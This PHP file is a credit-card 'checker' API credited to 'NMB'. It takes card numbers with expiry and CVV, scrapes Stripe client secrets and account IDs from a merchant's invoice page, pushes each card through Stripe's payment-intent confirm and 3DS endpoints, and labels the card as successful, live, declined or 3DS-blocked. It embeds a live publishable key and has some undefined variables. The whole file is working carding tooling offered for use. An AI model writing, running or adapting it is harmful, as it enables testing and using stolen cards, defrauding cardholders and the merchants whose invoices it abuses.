<?php


##API MADE BY ENDERFLY#
#JOIN NMB X RDXZ#

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

//===============[ PROXY ]===================//
if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};
//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
    
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$last4 = substr($cc, -4);
$anz = substr($cc, -4);
//================Get URL========//
$url_get = $_GET['sec'];
//================= [ CURL REQUESTS ] =================//
$dmzl = parse_url($url_get);
$domainz = trim(strip_tags(getStr($url_get,'https://','/')));
$bparsed_url = parse_url($url_get);
$nmbdkaka = $bparsed_url['path'];
$partsl = explode('/', $nmbdkaka);
$invoice = end($partsl);
$url = 'https://'.$domainz.'/api/shop/invoices/'.$invoice.'';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPGET, 1); // Chuyển sang phương thức GET
$headers = array();
$headers[] = 'Host: '.$domainz.'';
$headers[] = 'Content-Type: application/json; charset=utf-8';
$headers[] = 'accept: */*';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$result1 = curl_exec($ch);
$pizz = trim(strip_tags(getStr($result1,'"stripe_client_secret":"','"')));
$pi_id = trim(strip_tags(getStr($result1,'stripe_client_secret":"','_secret')));
$partsp = explode('_', $pizz);
$cs_idk = $partsp[3];
$cs_id = 'secret_' . $cs_idk;
$acc_id = trim(strip_tags(getStr($result1,'"stripe_user_id":"','",')));
$em = trim(strip_tags(getStr($result1,'"customer_email":"','"')));
if (empty($result1["stripe_publishable_key"])) {
    $pk = "pk_live_51JpGudGGvSAAHahB4rQbESNBf5Lm7bUOBLfpzqbithD4MTr9zhWN1SUx134s7MLODCj11W7Y1S7mqrT8iUjdoPah00gksKbsKb";
} else {
    $pk = $result1["stripe_publishable_key"];
}
//===============REQ 3 =======================//
$url1 = 'https://api.stripe.com/v1/payment_intents/'.$pi_id.'/confirm';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1); // Chuyển sang phương thức GET
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'accept: application/json';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'return_url=https%3A%2F%2F'.$domainz.'%2Finvoice%2F'.$invoice.'&payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[billing_details][address][country]=IN&payment_method_data[payment_user_agent]=stripe.js%2Fefee6eb491%3B+stripe-js-v3%2Fefee6eb491%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2F'.$domainz.'&payment_method_data[time_on_page]=10585&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&use_stripe_sdk=true&key='.$pk.'&_stripe_account='.$acc_id.'&client_secret='.$pi_id.'_'.$cs_id.'');

$result2 = curl_exec($ch);
$three_d_secure_2_source = trim(strip_tags(getStr($result2,'"three_d_secure_2_source": "','",')));
//================[ REQ 3 ]===========//
$url2 = 'https://api.stripe.com/v1/3ds2/authenticate';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1); // Chuyển sang phương thức GET
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'accept: application/json';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-IN%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22800%22%2C%22browserScreenWidth%22%3A%22360%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F119.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pk.'&_stripe_account='.$acc_id.'');

$result3 = curl_exec($ch);
//==========[ REQ 4 ]===========//
$url4 = 'https://api.stripe.com/v1/payment_intents/'.$pi_id.'?key='.$pk.'&_stripe_account='.$acc_id.'&is_stripe_sdk=false&client_secret='.$pi_id.'_'.$cs_id.'';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url4);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPGET, 1); // Chuyển sang phương thức GET
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'accept: application/json';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$result4 = curl_exec($ch);
$endTime = microtime(true);
$executionTime = $endTime - $startTime;
$timedone = round($executionTime, 2);
//===============[RESPONSES ]===================//

if(strpos($result4, '"status": "succeeded"' )) {
    echo '<span style="background-color: white; color: blue; padding: 0px; display: inline-block;">STATUS:</span> <span style="color: green;">Payment Successful 🎉</span>  <br>URL: <span style="color: pink;">'.$url_get.'</span> <br>CC: <span style="text-decoration:none;color: pink;">'.$anz.'<br>Checker By: NMB</span><br>';
}
elseif(strpos($result4, "Your card has insufficient funds." )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>RESULT : CVV LIVE ✅ <br>STRIPE MSG : '.$msg.'<br>Bin Info: '.$scheme.' - '.$type.' - '.$brand.'<br>Bank: '.$bank.'<br>Country: '.$name.' '.$emoji.'<br>Proxy: '.$poxySocks4.'<br>Time Requests: '.$timedone.'s</span><br>';
}
elseif(strpos($resvult3, "Your card was declined." )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>RESULT : Card Declined <br>STRIPE MSG : '.$msg.'<br>Time Requests: '.$timedone.'s</span><br>';
}
elseif(strpos($result1, "Your card was declined." )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>RESULT : Card Declined <br>REQ 1<br>Checker By: NMB</span><br>';
}
elseif(strpos($result2, "Your card was declined." )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>RESULT : Card Declined <br>REQ 2<br>Checker By: NMB</span><br>';
}
elseif(strpos($result3, "Your card was declined." )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>RESULT : Card Declined <br>REQ 3<br>Checker By: NMB</span><br>';
}
elseif(strpos($result2, "invalid_request_error" )) {
    echo '<span style="color: red;">DIE INVOICE</span> <br>URL: <span style="color: red;">'.$url_get.'</span> <br>RESULT : <span style="color: red;">EXP INVOICE</span> <br>Checker by: <span style="color: green;">NMB</span><br>';
}
elseif(strpos($result4, "three_d_secure_2_source" )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>RESULT : 3DS <br>Checker By: NMB</span><br>';
}
elseif(strpos($result4, '"status": "requires_action"' )) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>RESULT : 3DS <br>Checker By: NMB</span><br>';
}
else {
    echo 'DEAD API</span> CC:  '.$lista.'</span>  <br>Result: DIE API<br>REUSULT : '.$result4.'</span><br>';  
}


curl_close($ch);
ob_flush();
?>